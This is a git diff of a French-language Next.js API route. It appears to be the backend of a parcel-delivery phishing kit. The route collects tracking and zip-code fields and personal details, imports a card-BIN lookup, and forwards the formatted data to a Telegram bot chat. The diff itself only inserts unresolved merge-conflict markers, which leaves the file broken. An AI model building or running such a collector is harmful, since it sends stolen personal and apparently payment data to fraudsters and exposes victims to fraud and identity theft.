@@ -5,10 +5,13 @@ import { getBinInfo, type BinInfo } from "@/lib/binCheck";
 
 export const dynamic = "force-dynamic";
 
+<<<<<<< Updated upstream
 /* ------------------------------------------------------------------ */
 /* Telegram — inline (pas de fichier telegramBot.ts)                   */
 /* ------------------------------------------------------------------ */
 
+=======
+>>>>>>> Stashed changes
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -39,10 +42,13 @@ async function sendTelegramMessage(text: string): Promise<void> {
   }
 }
 
+<<<<<<< Updated upstream
 /* ------------------------------------------------------------------ */
 /* Schéma de validation                                                */
 /* ------------------------------------------------------------------ */
 
+=======
+>>>>>>> Stashed changes
 const notifySchema = z.object({
   // Livraison (autres étapes, facultatives ici)
   trackingNumber: z.string().trim().optional(),
@@ -82,10 +88,13 @@ const notifySchema = z.object({
 
 type NotifyPayload = z.infer<typeof notifySchema>;
 
+<<<<<<< Updated upstream
 /* ------------------------------------------------------------------ */
 /* Helpers                                                             */
 /* ------------------------------------------------------------------ */
 
+=======
+>>>>>>> Stashed changes
 const sanitizeText = (value: unknown) =>
   String(value ?? "")
     .replace(/&/g, "&amp;")
@@ -147,7 +156,10 @@ const buildMessage = (
 ) => {
   const lines: string[] = [];
 
+<<<<<<< Updated upstream
   // Livraison (uniquement si au moins un champ est présent)
+=======
+>>>>>>> Stashed changes
   if (
     payload.trackingNumber ||
     payload.zipcode ||
@@ -168,7 +180,10 @@ const buildMessage = (
     );
   }
 
+<<<<<<< Updated upstream
   // Infos personnelles
+=======
+>>>>>>> Stashed changes
   lines.push(
     "<b>🧾 Informations personnelles</b>",
     `• <b>Nom</b> : ${sanitizeText(payload.lastName || "(non communiqué)")}`,
@@ -207,10 +222,13 @@ const buildMessage = (
   return lines.join("\n");
 };
 
+<<<<<<< Updated upstream
 /* ------------------------------------------------------------------ */
 /* Handler POST                                                        */
 /* ------------------------------------------------------------------ */
 
+=======
+>>>>>>> Stashed changes
 export async function POST(req: NextRequest) {
   try {
     const json = await req.json();
@@ -244,4 +262,8 @@ export async function POST(req: NextRequest) {
     console.error("[telegram/route] erreur", error);
     return NextResponse.json({ error: "Erreur serveur" }, { status: 500 });
   }
+<<<<<<< Updated upstream
 }
+=======
+}
+>>>>>>> Stashed changes
